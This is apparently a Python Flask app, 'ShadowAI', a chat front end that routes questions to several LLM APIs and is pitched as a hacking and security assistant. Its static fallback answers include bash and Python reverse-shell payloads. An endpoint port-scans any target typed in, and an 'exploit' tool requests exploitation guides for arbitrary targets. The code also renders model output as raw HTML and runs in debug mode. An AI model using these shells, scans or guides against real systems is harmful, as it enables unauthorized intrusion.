#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║   ███████╗██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗    ██╗ █████╗ ██╗          ║
║   ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║    ██║██╔══██╗██║          ║
║   ███████╗███████║███████║██║  ██║██║   ██║██║ █╗ ██║███████║██║          ║
║   ╚════██║██╔══██║██╔══██║██║  ██║██║   ██║██║███╗██║██╔══██║██║          ║
║   ███████║██║  ██║██║  ██║██████╔╝╚██████╔╝╚███╔███╔╝██║  ██║███████╗     ║
║   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚══════╝     ║
║                                                                              ║
║   █████╗ ██╗          ██████╗██╗  ██╗ █████╗ ████████╗                     ║
║  ██╔══██╗██║         ██╔════╝██║  ██║██╔══██╗╚══██╔══╝                     ║
║  ███████║██║         ██║     ███████║███████║   ██║                        ║
║  ██╔══██║██║         ██║     ██╔══██║██╔══██║   ██║                        ║
║  ██║  ██║███████╗    ╚██████╗██║  ██║██║  ██║   ██║                        ║
║  ╚═╝  ╚═╝╚══════╝     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝                        ║
║                                                                              ║
║               🕵️  AI-Powered Security Intelligence Chat                      ║
║                                                                              ║
║  Author  : Ankit Patidar                                                      ║
║  GitHub  : https://github.com/ANKIT48274/shadowai                           ║
║  Version : 2.0 | License : MIT                                               ║
║                                                                              ║
║  🔥  "In the shadows, we find the truth."                                    ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import json, os, re, socket, subprocess, sys, time, uuid
from datetime import datetime
from pathlib import Path
from urllib.request import Request, urlopen
from urllib.error import HTTPError
from flask import Flask, render_template_string, request, jsonify, redirect

app = Flask(__name__)
app.secret_key = "shadowai-v2-secret-ankit-patidar"

# ─── AI Engine ───
class AI:
    def __init__(self):
        self.active = None; self.key = None; self.cfg = None
        self.history = []
        self._proxy_url = os.environ.get("ANTHROPIC_BASE_URL", "")
        self._proxy_key = os.environ.get("ANTHROPIC_API_KEY", "")
        self.providers = {
            "groq": {"name":"Groq 🆓","env":"GROQ_API_KEY","url":"https://api.groq.com/openai/v1/chat/completions","model":"llama-3.3-70b-versatile"},
            "gemini": {"name":"Gemini 🆓","env":"GEMINI_API_KEY","url":"https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent","model":"gemini-2.0-flash"},
            "claude": {"name":"Claude","env":"ANTHROPIC_API_KEY","url":"https://api.anthropic.com/v1/messages","model":"claude-sonnet-5"},
            "openai": {"name":"GPT-4o","env":"OPENAI_API_KEY","url":"https://api.openai.com/v1/chat/completions","model":"gpt-4o"},
        }
        # Check for local proxy (Claude Code proxy)
        self._proxy_url = os.environ.get("ANTHROPIC_BASE_URL", "")
        self._proxy_key = os.environ.get("ANTHROPIC_API_KEY", "")
        self._discover()

    def _discover(self):
        """Find available provider. Fallback to local AI if no API key."""
        # 1. GROQ API (Free & reliable!)
        import os
        for env_name in ["GROQ_API_KEY", "groq_api_key", "Groq_API_Key"]:
            k = os.environ.get(env_name)
            if k and len(k) > 10 and k != "gsk_your_key":
                self.active="groq"; self.key=k; self.cfg={"name":"Groq 🆓","url":"https://api.groq.com/openai/v1/chat/completions","model":"llama-3.3-70b-versatile"}
                print(f"  ✅ AI: Groq 🆓")
                return

        # 2. Gemini (Free)
        k = os.environ.get("GEMINI_API_KEY") or os.environ.get("Gemini_API_Key") or os.environ.get("gemini_api_key")
        if k:
            if not k.startswith("AIzaSy") and not k.startswith("AQ"):
                import re
                m = re.search(r'AIzaSy[a-zA-Z0-9_-]+', k)
                if m: k = m.group()
            self.active="gemini"; self.key=k; self.cfg={"name":"Gemini 🆓","url":"https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent","model":"gemini-2.0-flash"}
            print(f"  ✅ AI: Gemini 🆓")
            return

        # 2. Groq (Free)
        k = os.environ.get("GROQ_API_KEY")
        if k and k != "gsk_your_key" and len(k) > 10:
            self.active="groq"; self.key=k; self.cfg={"name":"Groq 🆓","url":"https://api.groq.com/openai/v1/chat/completions","model":"llama-3.3-70b-versatile"}
            print(f"  ✅ AI: Groq 🆓")
            return

        # 3. Claude proxy (local only)
        if self._proxy_url and self._proxy_key:
            self.active="proxy"; self.key=self._proxy_key; self.cfg={"name":"Claude Proxy","url":self._proxy_url,"model":"oc/deepseek-v4-flash-free"}
            print(f"  ✅ AI: Claude Proxy")
            return

        # 4. OpenAI (paid)
        k = os.environ.get("OPENAI_API_KEY")
        if k:
            self.active="openai"; self.key=k; self.cfg={"name":"GPT-4o","url":"https://api.openai.com/v1/chat/completions","model":"gpt-4o"}
            print(f"  ✅ AI: GPT-4o")
            return

        self.active = None; self.key = None; self.cfg = None


    def _local_ai(self, msg):
        """Try all providers + direct API calls."""
        # Try ALL possible keys from env
        possible_keys = [
            ("groq", os.environ.get("GROQ_API_KEY") or ""),
            ("gemini", os.environ.get("GEMINI_API_KEY") or os.environ.get("Gemini_API_Key") or ""),
            ("groq_alt", os.environ.get("GROQ_KEY") or ""),
        ]
        # Also try GitHub secrets style
        for env_name in ["GROQ_API_KEY", "GEMINI_API_KEY", "Gemini_API_Key"]:
            val = os.environ.get(env_name, "")
            if val and len(val) > 15:
                if "AIza" in val and not any(k[0]=="gemini" for k in possible_keys if len(k[1])>15):
                    possible_keys.append(("gemini", val))
                elif "gsk_" in val and not any(k[0]=="groq" for k in possible_keys if len(k[1])>15):
                    possible_keys.append(("groq", val))

        last_error = ""
        for provider, key in possible_keys:
            if len(key) < 15: continue

            try:
                if provider == "gemini" and "AIza" in key:
                    # Google Gemini call
                    body = json.dumps({"contents":[{"parts":[{"text":msg}]}],"generationConfig":{"temperature":0.7,"maxOutputTokens":2048}}).encode()
                    url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key={key}"
                    req = Request(url, data=body, headers={"Content-Type":"application/json"}, method="POST")
                    with urlopen(req, timeout=30) as r:
                        data = json.loads(r.read())
                        return data["candidates"][0]["content"]["parts"][0]["text"]
                else:
                    # GROQ/OpenAI compatible call
                    msgs = [{"role":"system","content":"You are ShadowAI by Ankit Patidar. Answer concisely with markdown."}, {"role":"user","content":msg}]
                    body = json.dumps({"model":"llama-3.3-70b-versatile","messages":msgs,"max_tokens":2048}).encode()
                    req = Request("https://api.groq.com/openai/v1/chat/completions", data=body,
                        headers={"Authorization":f"Bearer {key}","Content-Type":"application/json","User-Agent":"Mozilla/5.0"}, method="POST")
                    with urlopen(req, timeout=30) as r:
                        return json.loads(r.read())["choices"][0]["message"]["content"]
            except HTTPError as e:
                last_error = f"HTTP {e.code}"
                continue
            except Exception as e:
                last_error = str(e)[:80]
                continue

        # Fallback to static responses
        msg_lower = msg.lower()
        static = {
            "ip": "**🌐 IP Address**\n\nAn IP address uniquely identifies a device on a network.\n\n## Types:\n- **IPv4**: 32-bit (e.g., `192.168.1.1`)\n- **IPv6**: 128-bit (e.g., `2001:db8::1`)\n\n## Find your IP:\n```bash\ncurl ifconfig.me\nip addr show\n```",
            "reverse shell": "**🐚 Reverse Shell**\n\n## Payloads:\n```bash\n# Bash\nbash -i >& /dev/tcp/YOUR_IP/PORT 0>&1\n\n# Python\npython3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"YOUR_IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'\n\n# Listen:\nnc -lvnp PORT\n```",
            "hack": "⚠️ **Ethical Hacking**\n\nPractice safely:\n1. **CTF**: HackTheBox, TryHackMe\n2. **Bug Bounty**: HackerOne, Bugcrowd\n3. **VMs**: Metasploitable, DVWA\n4. **Learn**: Python, Linux, OWASP Top 10",
            "scan": "**🔍 Port Scanning**\n```bash\nnmap -sV --top-ports 1000 TARGET\nnmap -p- TARGET  # All ports\nnmap -sV -O TARGET  # OS detection\n```",
            "nmap": "**🔍 Nmap Commands**\n```bash\nnmap -sV TARGET\nnmap -p- TARGET\nnmap -sS -T4 TARGET\nnmap --script vuln TARGET\nnmap -sn 192.168.1.0/24\n```",
            "hello": "👋 **Hello! I'm ShadowAI** by **Ankit Patidar**.\nAsk me about security, hacking, networking, Linux, Windows, and more!",
        }
        for key, answer in static.items():
            if key in msg_lower:
                return answer

        if "403" in last_error or "forbidden" in last_error.lower():
            return "⚠️ API blocked on this server. Please set a valid GEMINI_API_KEY in Render Environment Variables."
        return f"⚠️ All APIs unavailable ({last_error}). Set a valid GEMINI_API_KEY in your Render Environment Variables and redeploy."
    @property
    def ready(self): return self.key is not None

    def chat(self, msg, system=None, temp=0.7):
        if not self.ready:
            # Still try direct GROQ call even if discovery failed
            return self._local_ai(msg)
        if not system:
            system = "You are ShadowAI, an expert cybersecurity assistant created by Ankit Patidar. You help with security, hacking, CTFs, and tech. Be precise, use markdown. If illegal activity asked, suggest authorized paths."
        self.history.append({"role":"user","content":msg})
        providers_to_try = [self.active] if self.active else []
        # Add fallback providers
        all_prov = {"gemini":"_gemini","groq":"_openai","openai":"_openai"}
        for p in all_prov:
            env_key = {"gemini":"GEMINI_API_KEY","groq":"GROQ_API_KEY","openai":"OPENAI_API_KEY"}[p]
            if p != self.active and (os.environ.get(env_key) or os.environ.get("Gemini_API_Key") or os.environ.get("gemini_api_key")):
                providers_to_try.append(p)
        if not providers_to_try:
            providers_to_try = [self.active] if self.active else ["gemini"]
        for prov in providers_to_try:
            try:
                if prov == "gemini":
                    resp = self._gemini(system, temp)
                elif prov == "groq":
                    resp = self._openai_simple("https://api.groq.com/openai/v1/chat/completions", self.key, system, temp)
                else:
                    resp = self._openai(system, temp)
                self.history.append({"role":"assistant","content":resp})
                if len(self.history)>40: self.history=self.history[-40:]
                return resp
            except HTTPError as e:
                if e.code in (429, 503, 403, 500, 502):
                    continue
                return f"⚠️ API Error ({e.code})"
            except Exception as e:
                continue
        # Fallback: local_ai uses direct GROQ
        return self._local_ai(msg)

    def _openai_simple(self, url, key, system, temp):
        """Simple OpenAI-compatible call (for fallback)."""
        msgs = [{"role":"system","content":system}]
        msgs.extend(self.history[-12:])
        model = "llama-3.3-70b-versatile" if "groq" in url else "gpt-4o"
        req = Request(url, data=json.dumps({"model":model,"messages":msgs,"temperature":temp,"max_tokens":4096}).encode(),
                     headers={"Authorization":f"Bearer {key}","Content-Type":"application/json"}, method="POST")
        with urlopen(req, timeout=120) as r:
            return json.loads(r.read())["choices"][0]["message"]["content"]

    def _openai(self, system, temp):
        msgs = [{"role":"system","content":system}]
        msgs.extend(self.history[-12:])
        req = Request(self.cfg["url"], data=json.dumps({"model":self.cfg["model"],"messages":msgs,"temperature":temp,"max_tokens":4096}).encode(),
                     headers={"Authorization":f"Bearer {self.key}","Content-Type":"application/json"}, method="POST")
        with urlopen(req, timeout=120) as r:
            return json.loads(r.read())["choices"][0]["message"]["content"]

    def _gemini(self, system, temp):
        ctx = "\n".join(f"{'User' if m['role']=='user' else 'Assistant'}: {m['content']}" for m in self.history[-12:])
        req = Request(f"{self.cfg['url']}?key={self.key}",
                     data=json.dumps({"contents":[{"parts":[{"text":f"{system}\n\nPrevious conversation:\n{ctx}\n\nUser: {self.history[-1]['content']}\nAssistant:"}]}],
                                      "generationConfig":{"temperature":temp,"maxOutputTokens":4096}}).encode(),
                     headers={"Content-Type":"application/json"}, method="POST")
        with urlopen(req, timeout=120) as r:
            return json.loads(r.read())["candidates"][0]["content"]["parts"][0]["text"]

    def _claude(self, system, temp):
        msgs = [{"role":m["role"],"content":m["content"]} for m in self.history[-12:]]
        req = Request(self.cfg["url"], data=json.dumps({"model":self.cfg["model"],"max_tokens":4096,"system":system,"messages":msgs,"temperature":temp}).encode(),
                     headers={"x-api-key":self.key,"anthropic-version":"2023-06-01","Content-Type":"application/json"}, method="POST")
        with urlopen(req, timeout=120) as r:
            return json.loads(r.read())["content"][0]["text"]

    def _proxy(self, system, temp):
        """Chat through local Claude Code proxy (SSE streaming format)."""
        msgs = [{"role":"user","content":f"Answer this question:\n\n{self.history[-1]['content']}"}]
        body = json.dumps({"model":self.cfg["model"],"max_tokens":4096,"messages":msgs})
        req = Request(f"{self.cfg['url']}/messages",
            data=body.encode(),
            headers={"x-api-key":self.key,"Content-Type":"application/json","anthropic-version":"2023-06-01"}, method="POST")
        try:
            resp = urlopen(req, timeout=120)
            raw = resp.read().decode('utf-8')
            texts = []
            for line in raw.split("\n"):
                if line.startswith("data: "):
                    try:
                        evt = json.loads(line[6:])
                        if evt.get("type") == "content_block_delta":
                            delta = evt.get("delta", {})
                            d_type = delta.get("type", "")
                            if d_type == "text_delta":
                                texts.append(delta.get("text", ""))
                    except:
                        pass
            if texts:
                return "".join(texts)
            return "⚠️ I couldn't generate a response. Please try again."
        except HTTPError as e:
            err = e.read().decode()[:200]
            raise Exception(f"Proxy error: {err}")

    def reset(self): self.history = []

ai = AI()


# ─── HTML TEMPLATE — EXACT CHATGPT CLONE ───
TEMPLATE = r"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ShadowAI — AI Security Assistant</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            font-family:'Inter',-apple-system,sans-serif;
            background:#212121;
            color:#ececec;
            height:100vh;overflow:hidden;
        }
        ::-webkit-scrollbar{width:6px}
        ::-webkit-scrollbar-thumb{background:#444;border-radius:3px}
        ::-webkit-scrollbar-track{background:transparent}

        /* ─── SIDEBAR ─── */
        .sidebar{
            position:fixed;left:0;top:0;bottom:0;width:260px;
            background:#171717;
            display:flex;flex-direction:column;
            z-index:100;transition:transform .2s;
        }
        .sidebar-header{
            padding:12px;border-bottom:1px solid #2a2a2a;
        }
        .new-chat-btn{
            width:100%;padding:10px;border-radius:8px;
            background:transparent;border:1px solid #3a3a3a;
            color:#ececec;font-size:13px;font-weight:500;
            cursor:pointer;display:flex;align-items:center;gap:8px;justify-content:center;
            transition:all .15s;
        }
        .new-chat-btn:hover{background:#2a2a2a}
        .chat-list{padding:8px;flex:1;overflow-y:auto}
        .chat-item{
            padding:10px 12px;border-radius:8px;font-size:13px;
            cursor:pointer;transition:all .15s;margin-bottom:2px;
            color:#b4b4b4;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;
        }
        .chat-item:hover{background:#2a2a2a;color:#ececec}
        .sidebar-section{
            padding:8px 12px 4px;font-size:11px;font-weight:600;
            color:#6b6b6b;text-transform:uppercase;letter-spacing:.5px;
        }
        .tool-item{
            padding:8px 12px;border-radius:6px;font-size:13px;
            cursor:pointer;transition:all .15s;margin:1px 8px;
            color:#b4b4b4;display:flex;align-items:center;gap:8px;
        }
        .tool-item:hover{background:#2a2a2a;color:#ececec}
        .sidebar-footer{
            padding:12px;border-top:1px solid #2a2a2a;
            font-size:11px;color:#6b6b6b;
        }

        /* ─── MAIN ─── */
        .main{margin-left:260px;display:flex;flex-direction:column;height:100vh}

        /* ─── TOPBAR ─── */
        .topbar{
            display:flex;align-items:center;justify-content:space-between;
            padding:8px 20px;border-bottom:1px solid #2a2a2a;
            background:#212121;min-height:48px;
        }
        .topbar-left{display:flex;align-items:center;gap:10px}
        .topbar-left .logo{
            font-weight:700;font-size:16px;
            background:linear-gradient(135deg,#00e676,#00c853);
            -webkit-background-clip:text;-webkit-text-fill-color:transparent;
        }
        .topbar-left .version{
            font-size:10px;padding:2px 6px;border-radius:4px;
            background:#2a2a2a;color:#6b6b6b;
        }
        .topbar-right{display:flex;align-items:center;gap:8px;font-size:12px}
        .model-badge{
            padding:4px 10px;border-radius:20px;
            background:#2a2a2a;color:#b4b4b4;font-size:11px;
        }
        .author-badge{
            font-size:11px;color:#6b6b6b;
        }
        .author-badge strong{color:#00e676}

        /* ─── CHAT ─── */
        .chat-area{flex:1;overflow-y:auto}
        .chat-scroll{max-width:720px;margin:0 auto;padding:24px 24px 0}

        .welcome{
            text-align:center;padding:80px 20px 40px;
        }
        .welcome-icon{font-size:56px;margin-bottom:8px}
        .welcome h1{
            font-size:2.4em;font-weight:700;
            background:linear-gradient(135deg,#00e676,#00c853);
            -webkit-background-clip:text;-webkit-text-fill-color:transparent;
            margin-bottom:4px;
        }
        .welcome p{color:#6b6b6b;font-size:14px;margin-bottom:24px}
        .suggestions{
            display:flex;flex-wrap:wrap;gap:8px;justify-content:center;
        }
        .suggestion{
            padding:10px 16px;border-radius:100px;
            background:#2a2a2a;border:1px solid #3a3a3a;
            color:#b4b4b4;font-size:13px;cursor:pointer;
            transition:all .15s;
        }
        .suggestion:hover{border-color:#00e676;color:#00e676;background:#1a3a2a}

        .msg{display:flex;gap:12px;margin-bottom:20px;animation:fadeIn .2s}
        @keyframes fadeIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
        .msg-avatar{
            width:30px;height:30px;border-radius:6px;
            display:flex;align-items:center;justify-content:center;
            font-size:15px;flex-shrink:0;margin-top:4px;
        }
        .msg-avatar.user{background:#2a2a2a;color:#b4b4b4}
        .msg-avatar.assistant{background:#1a3a2a;color:#00e676;border:1px solid #00e67633}
        .msg-content{
            flex:1;min-width:0;line-height:1.7;font-size:14.5px;color:#ececec;
        }
        .msg-content p{margin:6px 0}
        .msg-content pre{
            background:#000;padding:12px 16px;border-radius:8px;
            overflow-x:auto;margin:10px 0;font-family:'Fira Code',monospace;
            font-size:13px;line-height:1.5;border:1px solid #2a2a2a;
        }
        .msg-content code{
            font-family:'Fira Code',monospace;background:#00000066;
            padding:1px 5px;border-radius:4px;font-size:13px;
        }
        .msg-content pre code{background:none;padding:0}
        .msg-content table{width:100%;border-collapse:collapse;margin:10px 0}
        .msg-content th,.msg-content td{padding:8px 10px;border:1px solid #2a2a2a;text-align:left;font-size:13px}
        .msg-content th{background:#1a1a1a;color:#00e676;font-weight:600}
        .msg-content ul,.msg-content ol{padding-left:20px;margin:6px 0}
        .msg-content li{margin:3px 0}
        .msg-content h3{color:#00e676;margin:14px 0 6px;font-size:16px}
        .msg-content h2{color:#00e676;margin:16px 0 8px;font-size:18px}
        .msg-content h1{color:#00e676;margin:18px 0 10px;font-size:20px}
        .msg-content blockquote{
            border-left:3px solid #00e676;padding:6px 12px;margin:10px 0;
            background:#1a1a1a;border-radius:0 6px 6px 0;color:#b4b4b4;
        }
        .msg-content hr{border:none;border-top:1px solid #2a2a2a;margin:16px 0}
        .msg-content img{border-radius:6px;max-width:100%}

        /* ─── TYPING ─── */
        .typing{display:flex;gap:4px;padding:8px 0}
        .typing span{
            width:8px;height:8px;border-radius:50%;
            background:#00e676;animation:bounce 1.4s infinite;
        }
        .typing span:nth-child(2){animation-delay:.2s}
        .typing span:nth-child(3){animation-delay:.4s}
        @keyframes bounce{0%,60%,100%{transform:translateY(0);opacity:.4}30%{transform:translateY(-6px);opacity:1}}
        .typing-msg .msg-content p{color:#6b6b6b;font-size:13px;margin:0}

        /* ─── INPUT ─── */
        .input-area{
            padding:16px 24px 20px;
            background:linear-gradient(transparent,#212121);
        }
        .input-wrap{
            max-width:720px;margin:0 auto;
            background:#2a2a2a;border:1px solid #3a3a3a;
            border-radius:16px;padding:6px;
            display:flex;gap:6px;transition:all .15s;
        }
        .input-wrap:focus-within{border-color:#00e676;box-shadow:0 0 0 2px #00e67622}
        .input-wrap textarea{
            flex:1;padding:8px 12px;background:transparent;border:none;
            color:#ececec;font-size:14px;font-family:'Inter',sans-serif;
            outline:none;resize:none;min-height:24px;max-height:120px;
            line-height:1.5;
        }
        .input-wrap textarea::placeholder{color:#6b6b6b}
        .input-wrap button{
            padding:8px 16px;background:#00e676;color:#000;
            border:none;border-radius:10px;font-weight:600;font-size:13px;
            cursor:pointer;transition:all .15s;
        }
        .input-wrap button:hover{background:#00c853}
        .input-wrap button:disabled{opacity:.3;cursor:not-allowed}
        .input-note{
            max-width:720px;margin:6px auto 0;
            text-align:center;font-size:10px;color:#4a4a4a;
        }

        /* ─── RESPONSIVE ─── */
        @media(max-width:768px){
            .sidebar{transform:translateX(-100%)}
            .main{margin-left:0}
            .chat-scroll{padding:12px 16px}
            .input-area{padding:12px 16px}
        }
    </style>
</head>
<body>

    <!-- SIDEBAR -->
    <div class="sidebar">
        <div class="sidebar-header">
            <button class="new-chat-btn" onclick="newChat()">+ New Chat</button>
        </div>
        <div class="sidebar-section">Tools</div>
        <div class="tool-item" onclick="quickTool('scan')">🔍 Port Scan</div>
        <div class="tool-item" onclick="quickTool('dns')">📡 DNS Lookup</div>
        <div class="tool-item" onclick="quickTool('vuln')">🧠 Vuln Analysis</div>
        <div class="tool-item" onclick="quickTool('exploit')">💥 Exploit Guide</div>
        <div class="tool-item" onclick="quickTool('osint')">🕵️ OSINT</div>
        <div class="chat-list">
            <div class="sidebar-section">Chat History</div>
            <div class="chat-item">Current chat</div>
        </div>
        <div class="sidebar-footer">
            Made by <strong style="color:#00e676">Ankit Patidar</strong><br>
            ShadowAI v2.0
        </div>
    </div>

    <!-- MAIN -->
    <div class="main">
        <div class="topbar">
            <div class="topbar-left">
                <span class="logo">ShadowAI</span>
                <span class="version">v2.0</span>
            </div>
            <div class="topbar-right">
                <span class="model-badge">{{ model_status|safe }}</span>
                <span class="author-badge">by <strong>Ankit Patidar</strong></span>
            </div>
        </div>

        <!-- CHAT -->
        <div class="chat-area" id="chatArea">
            <div class="chat-scroll" id="chatScroll">
                <div id="welcomeScreen" class="welcome">
                    <div class="welcome-icon">🕵️</div>
                    <h1>ShadowAI</h1>
                    <p>AI-Powered Security Intelligence Assistant</p>
                    <div class="suggestions">
                        <span class="suggestion" onclick="ask('Scan example.com for open ports')">🔍 Scan target</span>
                        <span class="suggestion" onclick="ask('How to get a reverse shell?')">🐚 Reverse shell</span>
                        <span class="suggestion" onclick="ask('How to exploit SMB port 445?')">💥 SMB exploit</span>
                        <span class="suggestion" onclick="ask('What are the OWASP Top 10?')">🌐 Web security</span>
                        <span class="suggestion" onclick="ask('Nmap cheat sheet with examples')">📋 Nmap guide</span>
                        <span class="suggestion" onclick="ask('Best tools for bug bounty hunting')">🎯 Bug bounty</span>
                    </div>
                </div>
                <div id="messages"></div>
                <div id="typingIndicator" class="typing-msg" style="display:none">
                    <div class="msg">
                        <div class="msg-avatar assistant">🕵️</div>
                        <div class="msg-content">
                            <div class="typing"><span></span><span></span><span></span></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- INPUT -->
        <div class="input-area">
            <div class="input-wrap">
                <textarea id="chatInput" rows="1"
                    placeholder="Ask anything about security, hacking, tools..."
                    onkeydown="if(event.key==='Enter'&&!event.shiftKey){event.preventDefault();send()}"
                    oninput="this.style.height='auto';this.style.height=Math.min(this.scrollHeight,120)+'px'"></textarea>
                <button id="sendBtn" onclick="send()">➤</button>
            </div>
            <div class="input-note">Created by Ankit Patidar · For authorized testing only</div>
        </div>
    </div>

    <script>
        const $ = id=>document.getElementById(id);
        const msgs = $('messages'), chatScroll = $('chatScroll'), chatArea = $('chatArea');

        function scrollBottom(){chatArea.scrollTop=chatArea.scrollHeight}

        function fmt(text){
            // Code blocks
            text = text.replace(/```(\w*)\n?([\s\S]*?)```/g,'<pre><code>$2</code></pre>');
            // Inline code
            text = text.replace(/`([^`]+)`/g,'<code>$1</code>');
            // Bold
            text = text.replace(/\*\*([^*]+)\*\*/g,'<strong>$1</strong>');
            // Italic
            text = text.replace(/\*([^*]+)\*/g,'<em>$1</em>');
            // Headers
            text = text.replace(/^### (.+)$/gm,'<h3>$1</h3>');
            text = text.replace(/^## (.+)$/gm,'<h2>$1</h2>');
            text = text.replace(/^# (.+)$/gm,'<h1>$1</h1>');
            // Lists
            text = text.replace(/^- (.+)$/gm,'<li>$1</li>');
            text = text.replace(/(<li>[\s\S]*?<\/li>\n*)+/g,'<ul>$&</ul>');
            text = text.replace(/<\/ul>\n*<ul>/g,'');
            // Ordered lists
            text = text.replace(/^\d+\. (.+)$/gm,'<li>$1</li>');
            text = text.replace(/(?:<li>[\s\S]*?<\/li>\n*)+(?=($))/g,function(m){return m.includes('<ol')?m:'<ol>'+m+'</ol>'});
            // Blockquotes
            text = text.replace(/^> (.+)$/gm,'<blockquote>$1</blockquote>');
            text = text.replace(/<\/blockquote>\n*<blockquote>/g,'\n');
            // Horizontal rule
            text = text.replace(/^---$/gm,'<hr>');
            // Newlines
            text = text.replace(/\n\n/g,'</p><p>');
            text = text.replace(/\n/g,'<br>');
            return '<p>'+text+'</p>';
        }

        function addMsg(role, content, html){
            if($('welcomeScreen')) $('welcomeScreen').style.display='none';
            const div=document.createElement('div');div.className='msg';
            const av=document.createElement('div');av.className='msg-avatar '+role;
            av.textContent=role==='assistant'?'🕵️':'👤';
            const cd=document.createElement('div');cd.className='msg-content';
            cd.innerHTML=html?content:fmt(content.replace(/</g,'&lt;').replace(/>/g,'&gt;'));
            div.appendChild(av);div.appendChild(cd);msgs.appendChild(div);
            scrollBottom();
        }

        function showType(){$('typingIndicator').style.display='block';scrollBottom()}
        function hideType(){$('typingIndicator').style.display='none'}

        async function send(){
            const input=$('chatInput'), btn=$('sendBtn');
            const msg=input.value.trim();if(!msg)return;
            addMsg('user',msg);input.value='';input.style.height='auto';
            btn.disabled=true;showType();
            try{
                const r=await fetch('/api/chat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({message:msg})});
                const d=await r.json();
                hideType();
                addMsg('assistant',d.response||'⚠️ '+d.error,true);
            }catch(e){hideType();addMsg('assistant','⚠️ Error: '+e.message)}
            btn.disabled=false;input.focus();
        }

        function ask(t){$('chatInput').value=t;send()}

        function newChat(){
            msgs.innerHTML='';$('welcomeScreen').style.display='block';
            $('chatInput').value='';$('chatInput').focus();
            fetch('/api/new',{method:'POST'});
        }

        async function quickTool(tool){
            const target=prompt('Enter target domain/IP:');
            if(!target)return;
            addMsg('user','Running '+tool+' on: '+target);
            showType();
            try{
                const r=await fetch('/api/tool',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tool, target})});
                const d=await r.json();
                hideType();
                addMsg('assistant',d.response||'⚠️ '+d.error,true);
            }catch(e){hideType();addMsg('assistant','⚠️ Error: '+e.message)}
        }

        // Auto-focus
        $('chatInput').focus();
    </script>
</body>
</html>"""


# ─── ROUTES ───
@app.route('/')
def index():
    return render_template_string(TEMPLATE, model_status=ai.cfg['name'] if ai.ready else '⚠️ No API Key')

@app.route('/api/chat', methods=['POST'])
def chat():
    msg = request.get_json().get('message','').strip()
    if not msg: return jsonify({'error':'Empty'})
    return jsonify({'response': ai.chat(msg)})

@app.route('/api/new', methods=['POST'])
def new():
    ai.reset()
    return jsonify({'ok':True})

@app.route('/api/tool', methods=['POST'])
def tool():
    d = request.get_json()
    tool, target = d.get('tool',''), d.get('target','')
    if not target: return jsonify({'error':'No target'})

    if tool == 'scan':
        # Port scan logic
        try:
            import socket
            common = [21,22,23,25,53,80,110,135,139,143,389,443,445,993,995,
                      1433,1521,2049,2375,3306,3389,5432,5900,6379,6443,7001,
                      8080,8443,9090,9200,27017]
            target2 = target.replace('https://','').replace('http://','').split('/')[0]
            ip = socket.gethostbyname(target2)
            open_ports = []
            for p in common:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(1.5)
                if s.connect_ex((ip,p))==0: open_ports.append(p)
                s.close()
            ports_str = '\n'.join(f'- Port {p}' for p in open_ports)
            prompt = f"## 🔍 Scan Results: {target}\n**IP:** {ip}\n**Open Ports ({len(open_ports)}):**\n{ports_str}\n\nGive a security analysis with risk assessment and recommended actions."
            return jsonify({'response': ai.chat(prompt)})
        except Exception as e:
            return jsonify({'response':f"⚠️ Scan error: {str(e)}"})
    elif tool == 'dns':
        import subprocess as sp
        records = {}
        for r in ['A','AAAA','MX','NS','TXT']:
            rc = sp.run(['dig','+short',r,target],capture_output=True,text=True,timeout=5)
            if rc.stdout.strip(): records[r] = [x for x in rc.stdout.split('\n') if x.strip()][:4]
        text = f"## 📡 DNS Records: {target}\n" + '\n'.join(f'**{k}:** {", ".join(v)}' for k,v in records.items())
        return jsonify({'response': ai.chat(f"Format these DNS records nicely and add security analysis:\n{text}")})
    else:
        prompt_map = {'vuln':f"Perform a detailed vulnerability assessment for {target}. Include: risk score, CVEs, attack vectors, recommendations.",
                     'exploit':f"Create an exploitation guide for {target}. Include: recon, vulnerability identification, exploitation steps, post-exploitation.",
                     'osint':f"Perform OSINT on {target}. Include: whois, DNS, technology stack, security posture, additional techniques."}
        return jsonify({'response': ai.chat(prompt_map.get(tool, f"Analyze {target}"))})


if __name__ == '__main__':
    print(r"""
    ╔══════════════════════════════════════════════════╗
    ║                                                  ║
    ║        🕵️  ShadowAI  v2.0                        ║
    ║     AI Security Intelligence Chat                ║
    ║                                                  ║
    ║     Author: Ankit Patidar                        ║
    ║     GitHub: ANKIT48274/shadowai                  ║
    ║                                                  ║
    ║     🔗  http://localhost:5000                    ║
    ║                                                  ║
    ╚══════════════════════════════════════════════════╝
    """)
    app.run(host='0.0.0.0', port=5000, debug=True, threaded=True)
